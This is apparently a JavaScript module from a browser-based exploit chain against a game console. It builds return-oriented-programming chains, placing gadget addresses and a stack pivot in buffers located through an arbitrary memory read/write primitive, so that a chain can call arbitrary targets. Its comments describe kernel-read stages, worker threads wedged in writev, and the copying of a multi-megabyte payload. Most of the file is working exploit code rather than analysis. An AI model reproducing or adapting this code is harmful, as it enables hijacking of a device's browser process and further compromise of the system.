import { bufferAddress } from "./syscall.js";

export function put(dv, at, value) {
    if (typeof value === "number") {
        dv.setUint32(at, value >>> 0, true);
        dv.setUint32(at + 4, value < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, value.low >>> 0, true);
        dv.setUint32(at + 4, value.hi >>> 0, true);
    }
}

/*
 * Real event-loop yields.
 *
 * setTimeout(r, 0) is clamped to ~4 ms on the console AND only drains a
 * timer task -- it never lets the compositor paint, so the renderer's
 * "page isn't responding" watchdog keeps counting. In the stage-8 proc
 * walks that made the loop neck-and-neck with the watchdog even at one
 * yield per 16 steps.
 *
 * MessageChannel gives a genuine macrotask with ~0 ms latency (no timer
 * clamp), and requestAnimationFrame is what actually resets the watchdog
 * by producing a frame. forceYield() does the cheap macrotask every call
 * and a real rAF frame every ANIMATION_EVERY_CALLS so long walks keep the
 * page alive without paying a frame per step.
 */
const ANIMATION_EVERY_CALLS = 8;
// Upper bound on how long a single yield may wait for a frame before falling
// back to the timer. Frames normally arrive in ~16 ms; anything much past that
// on a console means the page is not being painted at all.
const FRAME_TIMEOUT_MS = 100;
let yieldCalls = 0;

let macrotaskResolvers = [];
if (typeof MessageChannel !== "undefined") {
    const channel = new MessageChannel();
    channel.port1.onmessage = function () {
        const r = macrotaskResolvers;
        macrotaskResolvers = [];
        for (let i = 0; i < r.length; ++i) r[i]();
    };
    var scheduleMacrotask = function (resolve) {
        macrotaskResolvers.push(resolve);
        channel.port2.postMessage(0);
    };
} else {
    var scheduleMacrotask = function (resolve) { setTimeout(resolve, 0); };
}

/*
BOUNDED, and this is the fix for the KREAD-BEGIN stop.

scheduleMacrotask pushes a resolver and calls port2.postMessage(0), then this
promise waits for port1.onmessage to drain the array. That delivery is a task
on the SAME event loop, so it can be starved -- and it was: the log stops at
    UIO-STEP  i=0 pre-forceYield
with four worker threads wedged inside writev (JOIN-TIMEOUT uio-fanout 4/4
parked). The main thread stays ALIVE but its task queue never dispatches the
MessageChannel callback, so this promise never settles and nothing after it
runs: not the drain, not the second boundedJoin, not the finally chain.

yieldFrame() already guards exactly this way for requestAnimationFrame
(Promise.race against FRAME_TIMEOUT_MS). The macrotask path had no guard at
all, which is why this was the one place in the file that could stall with no
reported reason.

A timer always fires -- timers are not starved by worker threads -- so racing
against one makes the yield guaranteed to complete. The macrotask still wins
when it is delivered; we simply stop waiting when it is not.
*/
function yieldMacrotask() {
    return new Promise(function (resolve) {
        let done = false;
        const finish = function () {
            if (!done) { done = true; resolve(); }
        };
        const timer = setTimeout(finish, FRAME_TIMEOUT_MS);
        scheduleMacrotask(function () { clearTimeout(timer); finish(); });
    });
}

/*
A rAF frame is what actually resets the renderer watchdog (rop.js:22-26), but
requestAnimationFrame CAN NEVER FIRE in a backgrounded/offscreen page -- the
callback is simply not serviced. Awaiting it then hangs forever, which is the
stall seen right after PAYLOAD-MAP (the multi-MB payload copy is the first
place with enough yields to reach an ANIMATION_EVERY_CALLS boundary).

So bound it: whichever of the frame or a short timer arrives first wins. When
frames ARE being serviced this still yields a real frame; when they are not, the
timer keeps the copy moving instead of freezing the process.
*/
function yieldFrame() {
    if (typeof requestAnimationFrame !== "function")
        return yieldMacrotask();
    return new Promise(function (resolve) {
        let done = false;
        const finish = function () { if (!done) { done = true; resolve(); } };
        const timer = setTimeout(finish, FRAME_TIMEOUT_MS);
        requestAnimationFrame(function () { clearTimeout(timer); finish(); });
    });
}

export async function forceYield() {
    yieldCalls++;
    if ((yieldCalls % ANIMATION_EVERY_CALLS) === 0) {
        await yieldFrame();
        return;
    }
    await yieldMacrotask();
}

export function createContext(options) {
    const { p, offsets, gadgets, keepAlive, tag, validate = false } = options;
    const pivotBytes = Math.max(0x28, (offsets.pivot_view_sp + 8 + 0xf) & ~0xf);
    const store = new ArrayBuffer(0x20);
    const pivot = new ArrayBuffer(pivotBytes);
    const stack = new ArrayBuffer(0x2000);
    const frame = new ArrayBuffer(0x40);
    const context = {
        tag,
        storeDv: new DataView(store), pivotDv: new DataView(pivot),
        stackDv: new DataView(stack), frameDv: new DataView(frame),
        stackU8: new Uint8Array(stack), frameU8: new Uint8Array(frame),
    };
    keepAlive.push(store, pivot, stack, frame, context.storeDv,
        context.pivotDv, context.stackDv, context.frameDv,
        context.stackU8, context.frameU8);
    context.S = bufferAddress(p, offsets, store);
    context.P = bufferAddress(p, offsets, pivot);
    context.K = bufferAddress(p, offsets, stack);
    context.F = bufferAddress(p, offsets, frame);
    if (validate) {
        for (const [view, address] of [[context.storeDv, context.S],
            [context.pivotDv, context.P], [context.stackDv, context.K],
            [context.frameDv, context.F]]) {
            view.setUint32(0, 0xdeadbeef, true);
            if (p.read4(address) !== 0xdeadbeef) return null;
            p.write4(address.add32(8), 0xfeedface);
            if (view.getUint32(8, true) !== 0xfeedface) return null;
            view.setUint32(0, 0, true);
            view.setUint32(8, 0, true);
        }
    }
    put(context.storeDv, 0x00, gadgets.G1);
    put(context.storeDv, 0x08, context.P);
    put(context.storeDv, 0x10, gadgets.G3);
    put(context.storeDv, 0x18, gadgets.G2);
    put(context.pivotDv, 0x00, context.P);
    put(context.pivotDv, 0x10, gadgets.G5);
    put(context.pivotDv, 0x20, gadgets.G4);
    return context;
}

export function layoutContext(context, offsets, gadgets, argGadgets,
    undefinedValue, target, args, putValue = put) {
    context.stackU8.fill(0);
    context.frameU8.fill(0);
    const instructions = [];
    for (let i = 0; i < args.length; ++i) {
        instructions.push(argGadgets[i], args[i]);
    }
    const targetIndex = instructions.length;
    instructions.push(target, gadgets.POP_RDI_RET, context.F,
        gadgets.MOV_RDI_RAX_RET,
        gadgets.POP_RAX_RET, undefinedValue, gadgets.LEAVE_RET);
    let at = 0x2000 - 8 * instructions.length;
    if (((context.K.low + at + 8 * targetIndex) & 0xf) !== 0) at -= 8;
    for (let i = 0; i < instructions.length; ++i)
        putValue(context.stackDv, at + 8 * i, instructions[i]);
    putValue(context.pivotDv, offsets.pivot_view_sp, context.K.add32(at));
    return { targetIndex, instructions };
}
